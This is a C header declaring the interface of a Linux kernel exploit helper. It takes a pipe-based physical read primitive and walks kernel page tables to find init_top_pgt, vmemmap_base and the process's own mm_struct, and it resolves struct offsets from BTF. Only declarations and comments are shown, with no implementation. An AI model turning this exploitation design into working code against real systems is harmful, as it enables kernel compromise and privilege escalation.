/* pagemap.h: public API for the zero-seed page-table walk and BTF offset resolver.
   pagemap.c is a SEPARATE translation unit (compile + link; do NOT #include the .c). The caller
   wires a physical-read callback via pm_set_read(); everything else is pure page-table/BTF logic. */
#ifndef PAGEMAP_H
#define PAGEMAP_H

/* wire the physical read primitive (the exploit's pipe forge). */
void pm_set_read(int (*rd)(unsigned long pa, void *buf, unsigned long len));

/* resolve all needed struct offsets from /sys/kernel/btf/vmlinux. 0 on success, -1 on failure
   (*bad <- the member name that could not be resolved). Called by pm_bootstrap. */
int pm_btf_init(const char **bad);

/* zero-seed bootstrap: trampoline level4_kernel_pgt phys + a known VR data PFN + VR's VA ->
   leaf_pt_phys (the reclaimed leaf page table). Returns 0 on failure with *stage set to the failing
   hop (1=find_itp 2=find_vmemmap 3=pgd_from_d0 4=leaf_pt_from_pgd 5=btf). */
unsigned long pm_bootstrap(unsigned long level4_phys, unsigned long d0_pfn,
                           unsigned long vr_va, int *stage);

/* accessors / reuse of the universal kernel-VA translator + BTF. */
unsigned long pm_itp(void);                  /* init_top_pgt phys (the translator root) */
unsigned long pm_vmemmap_base(void);         /* vmemmap_base (VA) */
unsigned long pm_kva2pa(unsigned long kva);  /* any kernel VA -> phys (walk via init_top_pgt) */
unsigned long pm_mm(void);                   /* our mm_struct (kva), captured during the bootstrap walk */
long pm_off(const char *s, const char *m);   /* BTF: byte offset of struct s member m (-1 if absent) */
long pm_szpage(void);                        /* sizeof(struct page) */

#endif /* PAGEMAP_H */
